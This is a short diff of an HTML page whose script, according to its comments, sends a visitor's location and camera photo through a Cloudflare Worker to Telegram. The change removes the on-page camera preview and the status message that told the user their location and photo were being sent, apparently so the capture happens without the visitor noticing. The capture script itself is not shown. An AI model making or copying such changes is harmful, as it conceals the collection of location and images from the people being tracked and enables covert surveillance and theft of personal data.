@@ -22,12 +22,6 @@
 </head>
 <body>
 
-<!-- Live camera preview shown while the photo is being taken -->
-<video id="v" autoplay playsinline muted></video>
-
-<!-- Status text shown to the user; gets updated by the script below -->
-<div id="s">📍 Sending location and photo...</div>
-
 <script>
   // The URL of your Cloudflare Worker, which receives the data and forwards it to Telegram.
   // No bot token is here — it's kept secret inside the Worker.
